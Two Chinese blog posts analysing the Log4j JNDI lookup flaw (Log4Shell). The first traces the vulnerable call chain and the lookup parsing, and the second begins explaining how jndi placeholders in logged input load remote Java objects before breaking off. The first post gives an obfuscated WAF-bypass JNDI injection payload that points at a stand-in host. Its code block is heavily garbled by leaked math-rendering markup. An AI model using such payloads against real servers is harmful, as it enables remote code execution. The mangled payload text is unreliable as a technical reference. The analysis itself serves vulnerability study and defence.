<span class="token variable">$ldapbind</span> = ldap_bind(<span class="token variable">$ldapconn</span>, 'username', <span class="token variable">$ldappass</span>);
<span class="token variable">$searchRows</span>= ldap_search(<span class="token variable">$ldapconn</span>, <span class="token variable">$basedn</span>, "</span><span class="token punctuation">(</span>cn<span class="token operator">=</span>*<span class="token punctuation">)</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$searchResult</span> <span class="token operator">=</span> ldap_get_entries<span class="token punctuation">(</span><span class="token variable">$ldapconn</span>, <span class="token variable">$searchRows</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ldap_close<span class="token punctuation">(</span><span class="token variable">$ldapconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
 <p>lookup：允许在写日志的时候，通过关键词去查找对象，输出对象，并实现对象功能。这个对象可以存储在硬盘中或者服务器上。</p> 
 <p>这个漏洞调用的就是这个接口</p> 
 <p>Codebase<br> 概念：一种服务<br> 作用：存储代码或者编译文件作用，可通过名称进行编译文件或者获取代码。</p> 
 <p>RMI协议：<br> 概念：远程方法调用协议，通过网络从远程计算机上请求调用某种服务。(只适合java)</p> 
 <p>原理：</p> 
 <pre><code class="prism language-bash">1.客户调用客户端辅助对象stub上的方法
2.客户端辅助对象stub打包调用信息（变量，方法名），通过网络发送给服务端辅助对象skeleton
3.服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象
4.调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton
5.服务端辅助对象将结果打包，发送给客户端辅助对象stub
6.客户端辅助对象将返回值解包，返回给调用者
7.客户获得返回值
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/3fa499394fd24ae781a710675c8acd81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h2><a id="_398"></a>漏洞原理知识点：</h2> 
 <p>加载原理：通过rmi进行从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类，进而造成RCE漏洞<br> <img src="https://img-blog.csdnimg.cn/69df0ca22e0b4552813cbd614b9b1583.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/f1dd7030daf84ef7a761550d2ce3145a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 详细跟进分析<br> 完整的调用链</p> 
 <pre><code class="prism language-bash">lookup:172, JndiManager <span class="token punctuation">(</span>org.apache.logging.log4j.core.net<span class="token punctuation">)</span>
lookup:56, JndiLookup <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
lookup:223, Interpolator <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
resolveVariable:1116, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
substitute:1038, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
substitute:912, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
replace:467, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
format:132, MessagePatternConverter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
format:38, PatternFormatter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
toSerializable:345, PatternLayout<span class="token variable">$PatternSerializer</span> <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
toText:244, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
encode:229, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
encode:59, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
directEncodeEvent:197, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
tryAppend:190, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
append:181, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
tryCallAppender:156, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppender0:129, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppenderPreventRecursion:120, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppender:84, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppenders:543, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
processLogEvent:502, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:485, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:460, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:63, DefaultReliabilityStrategy <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:161, Logger <span class="token punctuation">(</span>org.apache.logging.log4j.core<span class="token punctuation">)</span>
tryLogMessage:2198, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessageTrackRecursion:2152, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessageSafely:2135, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessage:2011, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logIfEnabled:1983, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
error:740, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
main:8, log4jRCE
</code></pre> 
 <p>这里要重点关注的几个点,其余的点几乎都是调用方法或者是进行过滤操作获取数字等</p> 
 <p>①这里进行判断了日志等级 如果是小于配置文件的即不能进入 this.logMessage()进行触发漏洞<br> 日志等级 默认只要大于error()和fatal()可以触发漏洞就可以触发漏洞了 具体看配置情况</p> 
 <pre><code class="prism language-bash">日志一共分为8个级别，由低到高依次为：All <span class="token operator">&lt;</span> Trace <span class="token operator">&lt;</span> Debug <span class="token operator">&lt;</span> Info <span class="token operator">&lt;</span> Warn <span class="token operator">&lt;</span> Error <span class="token operator">&lt;</span> Fatal <span class="token operator">&lt;</span> OFF。
1.All：最低等级的，用于打开所有日志记录。
2.Trace：是追踪，就是程序推进以下，你就可以写个trace输出，所以trace应该会特别多，不过没关系，我们可以设置最低日志级别不让他输出。
3.Debug：指出细粒度信息事件对调试应用程序是非常有帮助的。
4.Info：消息在粗粒度级别上突出强调应用程序的运行过程。
5.Warn：输出警告及warn以下级别的日志。
6.Error：输出错误信息日志。
7.Fatal：输出每个严重的错误事件将会导致应用程序的退出的日志。
8.OFF：最高等级的，用于关闭所有日志记录。
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/73e3102efdd84a04a0fc2e7369f1b0a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>配置的最低等级的文件数值在org/apache/logging/log4j/spi/StandardLevel.java中</p> 
 <p>②log:460, LoggerConfig (org.apache.logging.log4j.core.config)这个地方<br> 上面的东西查了下感觉就是线程相关所以可以不看 核心还是log的方法<br> <img src="https://img-blog.csdnimg.cn/5799870557bc4082a264da1d296ca530.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>③MessagePatternConverter方法<br> <img src="https://img-blog.csdnimg.cn/139cf5be2ec844e09f17ae280e7e4b10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④跟replace方法<br> 调用substitute方法<br> <img src="https://img-blog.csdnimg.cn/ec08848f5f074a31aa61e45471e4dd5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 先调用一个substitute的方法<br> <img src="https://img-blog.csdnimg.cn/9bc5bd97ada242ffa66b06fa365b8414.png" alt=""><br> 然后调用另外一个substitute的重载函数进行处理数据<br> ⑤研究substitute方法<br> 初始化定义的一些变量名<br> <img src="https://img-blog.csdnimg.cn/e1e99abe2a6f4999b9ccfd3673400d34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>采用while循环逐个去寻找前缀这里的前缀定义即是$和{字符<br> 进行前缀匹配<br> <img src="https://img-blog.csdnimg.cn/8c89829dcec34b189cb9a5d10749bd54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>寻找后缀唯一区别就是可以理解为一个从前查找一个从后查找<br> <img src="https://img-blog.csdnimg.cn/f01fb3723b9a4cb9bc3a6cea5543794a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>然后进行匹配 :- 和 :<br> 对于这种字符的处理 看一个师傅的说法是<br> :-<br> 赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb<br> :-<br> 是转义的 :-，如果一个用 a:b 表示的键值对的 key a 中包含 :，则需要使用转义来配合处理，例如 ${aaa:\-bbb:-ccc}，代表 key 是，aaa:bbb，value 是 ccc。<br> <mark>这也是绕waf的的一些原因</mark></p> 
 <pre><code class="prism language-bash">因此结合这些递归解析以及特性我们可以进行绕waf
构造出一些类似于如此的一些payload去绕
<p><span class="token variable">&#123;&#123;::-j&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>n</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-n&#125;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">n</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-d&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>i</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>k</mi><mi>e</mi><mi>y</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo><mo>:</mo><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-i&#125;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">i</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-r&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>m</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-m&#125;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">m</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-i&#125;</span>😕/domain.com/j<span class="token punctuation">&#125;</span></p>
<p></code></pre></p>
 <p><img src="https://img-blog.csdnimg.cn/a4ab0f7f897f435087a5144dc17935ee.png" alt="在这里插入图片描述"></p> 
 <p><img src="https://img-blog.csdnimg.cn/64cfe705bd6a40d18d0336ccc52591a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后在匹配完后调用resolveVariable解析满足 Lookup 功能的语法 也就是这里调用的lookup去产生漏洞的</p> 
 <p>如支持的协议 即按照协议的语法去进行解析<br> date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j<br> 这里的作用是<br> 进行执行完lookup,然后将结果替换回原字符串后，再次调用 substitute 方法进行递归解析<br> <img src="https://img-blog.csdnimg.cn/30b0772e37464b88b25acec8ae0592ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt=""></p> 
 <p>⑥跟lookup方法：产生漏洞的核心原因<br> <img src="https://img-blog.csdnimg.cn/7ff0c11987524e7aac19d9871b600f49.png" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/5c39a355863243a886a58aaaa13953c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后接着跟<br> 发觉核心就两部分<br> ①判断前缀部分<br> ②调用执行部分即调用jndiManager.lookup解析请求,最终形成注入漏洞.<br> <img src="https://img-blog.csdnimg.cn/1e9a7a7d7e95488a9a95207bddd85106.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:47.000Z" title="2023/4/27 17:20:47">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:22:53.841Z" title="2023/4/27 17:22:53">2023-04-27</time>更新</span><span class="level-item">9 分钟读完 (大约1386个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Log4J%E3%80%91%E5%85%B3%E4%BA%8E%E6%9C%80%E8%BF%91%E6%AF%94%E8%BE%83%E7%81%AB%E7%9A%84log4j%E7%A0%94%E7%A9%B6/">【Log4J】关于最近比较火的log4j研究</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="log4j关于最近比较火的log4j研究"><a class="markdownIt-Anchor" href="#log4j关于最近比较火的log4j研究">#</a> 【Log4J】关于最近比较火的 log4j 研究</h2>
<div id="content_views" class="htmledit_views"> 
 <p>最近log4j的安全漏洞搞得程序员人心慌慌，宣称为核弹级bug ，然后自己也找时间了解测试了一下。</p> 
 <p>Log4j是Apache的一个开源项目，通过使用Log4j，可以控制日志信息输送的目的地是控制台、文件等位置，是程序运行调试追溯问题发生位置的重要手段。</p> 
 <p><img alt="" height="439" src="https://img-blog.csdnimg.cn/5a64b8753efb4e28a7a8fe18cb3bec08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;如上，我们自定义username模仿前端请求数据，通过LOGGER.info打印登录的用户名，我们就可以在控制台查看打印的信息。这样我们就可以记录登录的用户。</p> 
 <p>前端传入什么参数，就会在控制台打印出相应参数。</p> 
 <p><img alt="" height="449" src="https://img-blog.csdnimg.cn/5259bd29abeb4d89befcf32d075e3acf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p></p> 
 <p>但当我们传入一些特定参数的时候，打印结果就与期待结果有点不一样了,我们用${java:os}登录打印的却是本机系统信息。</p> 
 <p><img alt="" height="425" src="https://img-blog.csdnimg.cn/b1537c7396ac4ff6b3910a5c7b70aa17.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;为什么会产生这种奇怪的现象呢？</p> 
 <p>是因为log4j提供了一个lookup的功能，对lookup功能不熟悉的也没有关系，你知道有这么个方法，可以把一些系统变量放到日志中就可以了。是不是有点sql注入的味道了。</p> 
 <p>&nbsp;如果只是打印一些简单的系统信息到还没有什么安全隐患。</p> 
 <p><strong>但离谱的是 log4j 还提供了关于 jndi 的占位符。</strong></p> 
 <p><strong>jndi </strong>可以理解为http 地址，log4j会自动加载通过 jndi 从远程服务器获取的 java 对象。就是说黑客用一个特殊标记的jndi字符串登录你的服务器，然后在你打印日志的时候，通过log4j识别远程调用黑客指定服务器的java对象，相当于在你的代码中植入了一段黑客的代码，他可以在这个java对象中写入任何逻辑，比如说植入一个挖矿程序啊，甚至删除你服务器上的任何文件，你说恐怖不 。</p> 
 <p></p> 
 <p></p> 
 <p>下面我写了一个示例代码：</p> 
 <p>我的service程序仍然是模拟简单的用户登录打印日志。但是登录用户确是一段包含特殊字符的字符串。</p> 
